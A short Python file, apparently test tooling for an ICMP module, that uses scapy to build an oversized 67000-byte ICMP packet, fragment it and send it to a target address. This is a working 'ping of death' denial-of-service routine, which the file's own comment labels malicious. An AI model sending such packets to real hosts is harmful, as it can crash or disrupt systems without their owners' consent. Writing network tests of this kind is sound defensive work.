'''
Functions to send ICMP packets to test the ICMP module
'''

from scapy.all import send, fragment, IP, ICMP

# Send a ping of death
# BE CAREFUL WITH THIS - THIS IS A MALICIOUS PACKET
def send_ping_of_death(target_ip, iface):
    packet = IP(dst=target_ip) / ICMP() / ('X'*67000)  # X's represent payload data

    frags = fragment(packet)

    for frag in frags:
        send(frag, verbose=0, iface=iface)
